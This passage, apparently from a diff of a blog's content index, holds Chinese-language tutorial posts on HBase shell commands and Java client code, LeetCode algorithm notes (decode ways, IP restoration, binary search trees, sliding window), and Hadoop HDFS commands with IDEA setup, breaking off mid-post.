+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.rootdir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hdfs://localhost:9000/hbase&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.cluster.distributed&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>需要先保证hadoop运行，s使用<code>jps</code>查看。<br><code>bin/start-hbase.sh</code><br>停止运行<code>stop-hbase.sh</code><br>进入HBase Shell模式：<code>hbase shell</code></p>
+<h1 id="0x01基本hbase-shell命令"><a href="#0x01基本hbase-shell命令" class="headerlink" title="0x01基本hbase shell命令"></a>0x01基本hbase shell命令</h1><h2 id="创建表create"><a href="#创建表create" class="headerlink" title="创建表create"></a>创建表create</h2><p>不需要创建数据库，直接建表就可，系统默认一个属性作为行键。<br>这里建一个student表，属性在后面跟随</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):001:0&gt; create &apos;student&apos;,&apos;Sname&apos;,&apos;Ssex&apos;,&apos;Sage&apos;,&apos;Sdept&apos;,&apos;course&apos;</span><br></pre></td></tr></table></figure>
+
+<p>在创建表的过程中如果有如下错误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: org.apache.hadoop.hbase.ipc.ServerNotRunningYetException: Server is not running yet</span><br></pre></td></tr></table></figure>
+
+<p>可以先关闭HBase，然后在hadoop的bin目录下执行<code>hdfs dfsadmin -safemode leave</code>，重启hbase即可。</p>
+<h2 id="查看表的基本信息describe"><a href="#查看表的基本信息describe" class="headerlink" title="查看表的基本信息describe"></a>查看表的基本信息describe</h2><p>使用<code>list</code>查看创建的表。<br>然后<code>describe &#39;tableName&#39;</code>查看。<br><img src="/images/hbase-basic/02.png" alt="pic1"></p>
+<h2 id="添加数据put"><a href="#添加数据put" class="headerlink" title="添加数据put"></a>添加数据put</h2><p>只能一次添加一个单元格数据，默认表名后面是一个行键</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; put &apos;student&apos;,&apos;2019001&apos;,&apos;Sname&apos;,&apos;YiJun&apos;</span><br></pre></td></tr></table></figure>
+
+<p>可以继续添加其它单元格数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):007:0&gt; put &apos;student&apos;,&apos;2019001&apos;,&apos;Ssex&apos;,&apos;male&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>这个是查看某一个键值的数据，后面跟表名，键值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):008:0&gt; get &apos;student&apos;,&apos;2019001&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h3><p>这个是查询某一个表的全部记录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):011:0&gt; scan &apos;student&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>put命令的逆操作，只删除一个单元格</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):012:0&gt; delete &apos;student&apos;,&apos;2019001&apos;,&apos;Ssex&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="delete-all"><a href="#delete-all" class="headerlink" title="delete all"></a>delete all</h3><p>删除某一键值的全部数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):014:0&gt; deleteall &apos;student&apos;,&apos;2019001&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><p>这个需要两步操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disable &apos;student&apos;</span><br><span class="line">drop &apos;student&apos;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-IDEA编程开发"><a href="#0x02-IDEA编程开发" class="headerlink" title="0x02 IDEA编程开发"></a>0x02 IDEA编程开发</h1><p>同hadoop一样，可以打包成jar包运行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop jar ****.jar</span><br></pre></td></tr></table></figure>
+
+<h2 id="在pom-xml中加入如下"><a href="#在pom-xml中加入如下" class="headerlink" title="在pom.xml中加入如下"></a>在pom.xml中加入如下</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;hbase-client&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.11&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试如下代码，该资料来源与互联网。<br><a href="http://dblab.xmu.edu.cn/blog/1593-2/" target="_blank" rel="noopener">代码链接</a></p>
+<h2 id="连接代码"><a href="#连接代码" class="headerlink" title="连接代码"></a>连接代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">configuration  = HBaseConfiguration.create();</span><br><span class="line">configuration.set(&quot;hbase.rootdir&quot;,&quot;hdfs://localhost:9000/hbase&quot;);</span><br><span class="line">try&#123;</span><br><span class="line">    connection = ConnectionFactory.createConnection(configuration);</span><br><span class="line">    admin = connection.getAdmin();</span><br><span class="line">&#125;catch (IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void close()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            if(admin != null)&#123;</span><br><span class="line">                admin.close();</span><br><span class="line">            &#125;</span><br><span class="line">            if(null != connection)&#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="建立表"><a href="#建立表" class="headerlink" title="建立表"></a>建立表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void createTable(String myTableName,String[] colFamily) throws IOException &#123; </span><br><span class="line">        init();</span><br><span class="line">        TableName tableName = TableName.valueOf(myTableName); </span><br><span class="line">        if(admin.tableExists(tableName))&#123;</span><br><span class="line">            System.out.println(&quot;talbe is exists!&quot;);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            HTableDescriptor hTableDescriptor = new HTableDescriptor(tableName);</span><br><span class="line">            for(String str:colFamily)&#123;</span><br><span class="line">                HColumnDescriptor hColumnDescriptor = new HColumnDescriptor(str);</span><br><span class="line">                hTableDescriptor.addFamily(hColumnDescriptor);</span><br><span class="line">            &#125;</span><br><span class="line">            admin.createTable(hTableDescriptor);</span><br><span class="line">        &#125;</span><br><span class="line">        close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="删表"><a href="#删表" class="headerlink" title="删表"></a>删表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void deleteTable(String tableName) throws IOException &#123;</span><br><span class="line">    init();</span><br><span class="line">    TableName tn = TableName.valueOf(tableName);</span><br><span class="line">    if (admin.tableExists(tn)) &#123;</span><br><span class="line">        admin.disableTable(tn);</span><br><span class="line">        admin.deleteTable(tn);</span><br><span class="line">    &#125;</span><br><span class="line">    close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看所有表信息"><a href="#查看所有表信息" class="headerlink" title="查看所有表信息"></a>查看所有表信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void listTables() throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        HTableDescriptor hTableDescriptors[] = admin.listTables();</span><br><span class="line">        for(HTableDescriptor hTableDescriptor :hTableDescriptors)&#123;</span><br><span class="line">            System.out.println(hTableDescriptor.getNameAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.cnblogs.com/heibaiying/p/11404883.html" target="_blank" rel="noopener">https://www.cnblogs.com/heibaiying/p/11404883.html</a><br>[2] <a href="http://dblab.xmu.edu.cn/post/bigdatapractice/#xiazaizhuanqu" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/post/bigdatapractice/#xiazaizhuanqu</a></p>
+]]></content>
+      <categories>
+        <category>bigdata</category>
+      </categories>
+      <tags>
+        <tag>hbase</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode</title>
+    <url>/2019/11/21/leetcode/</url>
+    <content><![CDATA[<p>leetcode做题笔记</p>
+<a id="more"></a>
+<h1 id="91题"><a href="#91题" class="headerlink" title="91题"></a>91题</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一条包含字母<code>A-Z</code>的消息通过以下方式进行了编码，给定一个只包含数字的非空字符串，请计算解码方法的总数。<br>‘A’ -&gt; 1  ‘B’ -&gt; 2   …  ‘Z’ -&gt; 26<br><a href="https://leetcode-cn.com/problems/decode-ways/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>初看可以通过暴力破解，但是超时。改用动态规划<br>设<code>dp[i]={字符串下标i结尾的解码方法数}</code>。<br>如果不加限制，可以得到<code>dp[i]=dp[i-1]+dp[i-2]</code><br>此题目有限制：0不能解码，00不能解码，01不能解码。当i,i+1组合的数字不在[1,26]，就不用计算dp[i-2]。<br>因此在求解dp[i]的时候需要分情况讨论：需要查看dp[i-1]的值。</p>
+<blockquote>
+<p>注意：以下的加上dp[i-2]的时候都要讨论是否成立(两位字符组成的数字是否在[1.26])</p>
+<ul>
+<li><code>dp[i-1]==0 &amp;&amp; dp[i] == 0</code>  return 0。</li>
+<li><code>dp[i-1]==0 &amp;&amp; dp[i] != 0</code>  这种情况因为前一位是0，两位数字无法解码，dp[i]=dp[i-1]。</li>
+<li><code>dp[i-1]!=0 &amp;&amp; dp[i] == 0</code>  0不能解码。dp[i]=condition{dp[i-2]}</li>
+<li><code>dp[i-1]!=0 &amp;&amp; dp[i] != 0</code>  dp[i]=dp[i-1]+condition{dp[i-2]}</li>
+</ul>
+</blockquote>
+<h1 id="93复原IP地址"><a href="#93复原IP地址" class="headerlink" title="93复原IP地址"></a>93复原IP地址</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包含数字的字符串，复原它并返回所有可能的 IP 地址格式。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;25525511135&quot;</span><br><span class="line">输出: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;]</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://leetcode.com/submissions/detail/280818977/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h2><p>可以使用暴力法来求解。<br>这里我使用回溯求解问题。主要是在这些字符串里面放置三个点，并且每一个点的最多有三位数字<br>先分割第一串，如2()，25()，255()。括号里面的是在下次递归用到的。<br><code>dfs(vector&lt;string&gt; &amp;re, string temp, string s, int start, int dot)</code><br>每次在得到一个数字的时候需要判断是否合法，如果不合法，就在这回溯。不合法的时候是不能切割出数字，有前导0，不在0-255这个范围。当dot==0的时候，是到叶子节点了，此时判断切割的数字是否合法。</p>
+<h1 id="95不同的二叉搜索树II"><a href="#95不同的二叉搜索树II" class="headerlink" title="95不同的二叉搜索树II"></a>95不同的二叉搜索树II</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数 n，生成所有由 1 … n 为节点所组成的二叉搜索树<br><a href="https://leetcode.com/problems/unique-binary-search-trees-ii/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h2><p>可以使用递归来求解，定义<code>vector&lt;TreeNode*&gt; dfs(int start, int end)</code>求解所有的数字从[start,end]组成的二叉搜索树。<br>分别将[1,n]中的一个节点<code>i</code>当作根节点，那么求得所有的左子树为<code>dfs(start, i-1)</code>，求得所有的右子树为<code>dfs(i+1, end)</code>。最后将两个集合分别添加到<code>i</code>的左右子树中。<br>这里有一个边界情况，当<code>start&gt;end</code>的时候子树是一个空树，需要返回。</p>
+<h1 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96 不同的二叉搜索树"></a>96 不同的二叉搜索树</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数 n，求以 1 … n 为节点组成的二叉搜索树有多少种？<br><a href="https://leetcode.com/problems/unique-binary-search-trees/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h2><p>这里可以使用递归的方法求解，如95题一样。但是可以使用动态规划如下。<br><code>dp[i]</code>表示i个节点能够组成的不同二叉搜索树的数目，可以得到dp[0]=1(空树)，dp[1]=1(单个节点的树)。<br>求解n个节点的时候，可以将[1,n]不同的树分别依次当作跟节点。对于每一个情形下的跟节点，能够组成二叉搜索树的数目等于<code>左子树的个数×右子树的个数</code>。<br>所以有如下推断：</p>
+<blockquote>
+<p>1为跟节点：左子树只有0个节点，右子树有n-1个节点<br>2为跟节点：左子树只有1个节点，右子树有n-2个节点<br>………<br>n为跟节点：左子树只有n-1个节点，右子树有0个节点</p>
+</blockquote>
+<p>得到状态方程：<code>dp[n]=dp[0]*dp[n-1]+dp[1]*dp[n-2]+....+dp[n-1]*dp[0]</code></p>
+<h1 id="97交错字符串"><a href="#97交错字符串" class="headerlink" title="97交错字符串"></a>97交错字符串</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>给定字符串s1，s2，s3，判定s3是否由s1与s2交错组成的。</p>
+<blockquote>
+<p>Input: s1 = “aabcc”, s2 = “dbbca”, s3 = “aadbbcbcac”<br>Output: true</p>
+</blockquote>
+<p><a href="https://leetcode.com/problems/interleaving-string/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h2><p>动态规划解法。<br>设<code>dp[i][j]=1</code>表示字符串s1的前i个字符与s2的前j个字符能够交错组成s3的前i+j个字符，下标从1开始。<br>一个例子如下<br>s1:aabcc, 长度为5<br>s2:dbbca， 长度为5<br>s3:aadbbcbcac。长度为10<br>可以看到s1的最后一个字符与s3最后一个字符相等，只需要判断s1.substr(0,4)，s2，s3.substr(0,9)能否组成交错字符串就行了。<br>因此可以得到如下的状态转移方程<br><code>dp[i][j]={ if(s1[i]==s3[i+j]) dp[i-1][j] ||  if(s2[j]==s3[i+j]) dp[i][j+1] }</code><br>为了方便求解，需要定义空字符串。i=0表示s1是空，只看s2就行了。最后的dp表大致结构(仅仅是举例)如下。<strong>计算过程首先要计算dp[i][0]和dp[0][i]。</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  * 1 2 3 4 </span><br><span class="line">* T F</span><br><span class="line">1 T</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<h1 id="98验证二叉搜索树"><a href="#98验证二叉搜索树" class="headerlink" title="98验证二叉搜索树"></a>98验证二叉搜索树</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。二叉搜索树的特征如下：<br>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。<br><a href="https://leetcode.com/problems/validate-binary-search-tree/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h2><p>可以使用递归解法，对于当前的节点，先判断它的左节点是否小于它本身，右节点是否大于该节点的值，但是这里却不能保障右节点的子树中出现比该节点小的值，如下的一棵树。<br><img src="/images/leetcode/01.png" alt="pic1"><br>可以保障每一个节点符合二叉搜索树要求(左节点小于根节点&amp;&amp;右节点大于根节点)。但是6小于10。不符合要求。所以我们在递归的时候需要传递一个最大值，最小值判断当前的根节点是否符号要求。特别需要注意int数据的范围。<br><code>bool helper(TreeNode* root, long long min, long long max)</code><br>对此，需要传递参数min和max，判定当前节点是否符合区间要求，如果不符合，就返回false。如果当前节点符合区间要求，就分别递归左右子树，同时传递新的区间给下面。<br>区间传递原则：对于一个节点的左子树，它的值最大是该节点本身所以有<br><code>leftB=helper(root-&gt;left, min, root-&gt;val)</code>，对于右子树，它的所有节点最小值是该节点本身，所以有<code>rightB=helper(root-&gt;right, root-&gt;val, max)</code>。</p>
+<h1 id="76最小覆盖子串"><a href="#76最小覆盖子串" class="headerlink" title="76最小覆盖子串"></a>76最小覆盖子串</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 S、一个字符串 T，请在字符串 S 里面找出：包含 T 所有字母的最小子串。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;</span><br><span class="line">Output: &quot;BANC&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://leetcode.com/problems/minimum-window-substring/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h2><p>1) 思路：这里使用滑动窗口求解。思路是这样的，先扩大再收缩，如所给例子中，left，right分别代表窗口的两端。<br><img src="/images/leetcode/02.png" alt="pic2"><br>第一次扩大窗口，直到窗口里面包含有字符串T，此时为[0,5]。然后进行收缩，从左边开始，结束的条件是窗口中不包含字符串T的字母，此时为[1,5]。<br>第二次向右开始扩大窗口，知道再次包含T，此时为[1,10]。然后进行收缩，left移动，直到窗口中不在包含T，此时为[6,10]。<br>第三次右扩，此时为[6,12]，包含右T。然后收缩，变为[10,12]。<br>无法右扩，结束。<br>2) 需要解决的问题：如何判断字符串S中包含T：用<code>Map&lt;char, int&gt;</code>来存储T，表示T中的每一个字符的个数。<code>cnt</code>表示窗口中包含的字符种类数，右扩的时候，遍历S的时候，遇到字符ch，如果ch再map中存在，map[ch]减一，如果等于0了，表示该字符已经得到(cnt++)，<code>cnt==map_size()</code>说明已经包含T了。左收缩的时候，遇到S中的字符时，就map[ch]–，如果等于1，说明该S中刚好没有包含T。<br>3) 滑动窗口求解框架</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化窗口</span><br><span class="line">//开始滑动窗口</span><br><span class="line">while (left &lt;= right &amp;&amp; left &lt; s.length()-1 &amp;&amp; right &lt; s.length()-1) &#123;</span><br><span class="line">	//右窗口扩展</span><br><span class="line">	while (cnt &lt; lens &amp;&amp; right &lt; s.length()) &#123;</span><br><span class="line">		right++;</span><br><span class="line">		进行有关判断条件</span><br><span class="line">	&#125;</span><br><span class="line">	//左窗口收缩</span><br><span class="line">	while (cnt == lens &amp;&amp; left &lt; s.length()) &#123;</span><br><span class="line">		if(无法收缩了)&#123;</span><br><span class="line">		   记录当前值</span><br><span class="line">		&#125;</span><br><span class="line">		left++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239 滑动窗口最大值"></a>239 滑动窗口最大值</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧，你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。返回滑动窗口中的最大值。<br><a href="https://leetcode.com/problems/sliding-window-maximum/" target="_blank" rel="noopener">题目</a></p>
+<h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>这个题目的关键是找到每个窗口的最大值，一个有效的办法是用一个类似于二叉搜索树这样的数据结构，方便插入和删除，同时也能保持数值有序，STL模板中的<code>multiset</code>提供这样一个功能，内部使用红黑树实现，每一次插入和删除保持数据有序，最大值可以通过<code>*mulset.rbegin()</code>获得。因此可以用这个数据结构模拟窗口滑动过程即可。需要注意的是<code>erase(val)</code>是删除所有符合val的值，因此需要使用迭代器来删除数据。</p>
+<h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>使用一个双端队列来完成，队列deque的队首保存当前窗口中的最大值，re中保存结果。队列需要保存的是数组的索引。测试用例是<code>nums = [1,3,-1,-3,5,3,6,7]</code>，和<code>k = 3</code>，具体操作见如下：<br>第一步，遍历到第一个值的时候，进入双端队列deque。队首元素是当前最大值（保存索引）<br><img src="/images/leetcode/03_1.png" alt="pic"></p>
+<p>第二步：遍历到第二个值，3大于当前队首的值，所以当前窗口最大值不是双端队列的元素，因此队首元素出栈，将3从队首插入。<br><img src="/images/leetcode/03_2.png" alt="pic"></p>
+<p>第三步：遍历到第三个值，-1比队首值小，但是它有可能成为接下来窗口的最大值，因此从队尾插入。此时达到了窗口大小，将队首元素插入到结果集中。<br><img src="/images/leetcode/03_3.png" alt="pic"></p>
+<p>第四步：继续遍历，窗口发生移动，检查队首元素下标还在当前窗口，-3有可能成为最大值，从队尾插入。窗口移动过程中产生一个最大值，即队首元素保存到结果集中<br><img src="/images/leetcode/03_4.png" alt="pic"></p>
+<p>第五步: 继续遍历，移动窗口，当前元素为5，但是双端队列中一些元素不在当前窗口，因此将清理无效数据，队首元素从队首出队。又当前元素为5，与队首比较，大于-1，队首-1出栈，继续比较直到队首元素大于5或者为空。<br><img src="/images/leetcode/03_5.png" alt="pic"><br>该算法框架如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int[] maxSlidingWindow(int[] a, int k) &#123;		</span><br><span class="line">		if (a == null || k &lt;= 0) &#123;</span><br><span class="line">			return new int[0];</span><br><span class="line">		&#125;</span><br><span class="line">		int n = a.length;</span><br><span class="line">		int[] r = new int[n-k+1];</span><br><span class="line">		int ri = 0;</span><br><span class="line">		// store index</span><br><span class="line">		Deque&lt;Integer&gt; q = new ArrayDeque&lt;&gt;();</span><br><span class="line">		for (int i = 0; i &lt; a.length; i++) &#123;</span><br><span class="line">			// remove numbers out of range k</span><br><span class="line">			while (!q.isEmpty() &amp;&amp; q.peek() &lt; i - k + 1) &#123;</span><br><span class="line">				q.poll();</span><br><span class="line">			&#125;</span><br><span class="line">			// remove smaller numbers in k range as they are useless</span><br><span class="line">			while (!q.isEmpty() &amp;&amp; a[q.peekLast()] &lt; a[i]) &#123;</span><br><span class="line">				q.pollLast();</span><br><span class="line">			&#125;</span><br><span class="line">			// q contains index... r contains content</span><br><span class="line">			q.offer(i);</span><br><span class="line">			if (i &gt;= k - 1) &#123;</span><br><span class="line">				r[ri++] = a[q.peek()];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return r;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>algorithm</category>
+      </categories>
+      <tags>
+        <tag>leetcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hadoop01--basic</title>
+    <url>/2019/11/14/hadoop01-basic/</url>
+    <content><![CDATA[<p>hadoop2.7.1入门之基本命令</p>
+<a id="more"></a>
+<p>hadoop安装<br>Hadoop基本命令<br>idea环境下的开发</p>
+<h1 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h1><p>环境:</p>
+<blockquote>
+<p>hadoop:2.7.2<br>java:1.8.0_181<br>maven:3.6.1<br>IDEA:2018.03</p>
+</blockquote>
+<p>安装过程将给出的文档。<br><a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/SingleCluster.html#Pseudo-Distributed_Operation" target="_blank" rel="noopener">https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/SingleCluster.html#Pseudo-Distributed_Operation</a></p>
+<p><a href="http://dblab.xmu.edu.cn/blog/install-hadoop/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/install-hadoop/</a>  <br><br>安装完成后可以通过web界面查看<code>http://106.14.124.205:50070</code></p>
+<h1 id="0x01基本命令"><a href="#0x01基本命令" class="headerlink" title="0x01基本命令"></a>0x01基本命令</h1><h2 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -mkdir -p /class4</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/FileSystemShell.html#mkdir" target="_blank" rel="noopener">hadoop fs 官方命令</a></p>
+<h2 id="查看列表"><a href="#查看列表" class="headerlink" title="查看列表"></a>查看列表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -ls [-d] [-h] [-R] &lt;args&gt;</span><br><span class="line">eg: hadoop fs -ls /</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/FileSystemShell.html#ls" target="_blank" rel="noopener">hadoop ls 官方命令</a></p>
+<h2 id="本地上传文件至hdfs系统"><a href="#本地上传文件至hdfs系统" class="headerlink" title="本地上传文件至hdfs系统"></a>本地上传文件至hdfs系统</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: hadoop fs -copyFromLocal &lt;localsrc&gt; URI</span><br><span class="line">hadoop fs -copyFromLocal hdfs2local.txt  /class4/hdfs2local.txt</span><br></pre></td></tr></table></figure>
+
+<p>还有另外一个命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: hadoop fs -put &lt;localsrc&gt; ... &lt;dst&gt;</span><br><span class="line">hadoop fs -put test.txt /class4</span><br></pre></td></tr></table></figure>
+
+<h2 id="hdfs系统下载文件到本地文件系统"><a href="#hdfs系统下载文件到本地文件系统" class="headerlink" title="hdfs系统下载文件到本地文件系统"></a>hdfs系统下载文件到本地文件系统</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -get /class4/test.txt /opt/download</span><br></pre></td></tr></table></figure>
+
+<h2 id="hdfs系统内部文件的复制"><a href="#hdfs系统内部文件的复制" class="headerlink" title="hdfs系统内部文件的复制"></a>hdfs系统内部文件的复制</h2><p>从一个目录复制到另外一个目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -cp /class4/test.txt /input1</span><br></pre></td></tr></table></figure>
+
+<h2 id="hdfs删除文件或者目录"><a href="#hdfs删除文件或者目录" class="headerlink" title="hdfs删除文件或者目录"></a>hdfs删除文件或者目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: hadoop fs -rm [-f] [-r |-R] [-skipTrash] URI [URI ...]</span><br><span class="line">The -f option will not display a diagnostic message or modify the exit status to reflect an error if the file does not exist.</span><br><span class="line">The -R option deletes the directory and any content under it recursively.</span><br><span class="line">The -r option is equivalent to -R.</span><br></pre></td></tr></table></figure>
+
+<p>一个示例：<code>hadoop fs -rm  /user/hadoop/emptydir</code></p>
+<h1 id="0x02-idea开发环境配置"><a href="#0x02-idea开发环境配置" class="headerlink" title="0x02 idea开发环境配置"></a>0x02 idea开发环境配置</h1><p><strong>建议使用mavaen3.6.1</strong>，不然会报错。<br>一个测试例子如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        String fileName = &quot;/class4/test.txt&quot;;</span><br><span class="line">        Configuration conf = new Configuration();</span><br><span class="line">        conf.set(&quot;fs.defaultFS&quot;, &quot;hdfs://localhost:9000&quot;);</span><br><span class="line">        conf.set(&quot;fs.hdfs.impl&quot;, &quot;org.apache.hadoop.hdfs.DistributedFileSystem&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            FileSystem fs = FileSystem.get(conf);</span><br><span class="line">            if(fs.exists(new Path(fileName)))&#123;</span><br><span class="line">                System.out.println(&quot;文件存在&quot;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                System.out.println(&quot;文件不存在&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="普通的java项目开发"><a href="#普通的java项目开发" class="headerlink" title="普通的java项目开发"></a>普通的java项目开发</h2><blockquote>
+<p>这里的开发环境是本地win10，hadoop集群在linux系统上。<br>ctrl+alt +t生成try-catch代码</p>
+<ul>
+<li>step1: 新建java工程，导入jar包(根据需要选择)。</li>
+<li>step2: 建立java源文件，进行代码编写。</li>
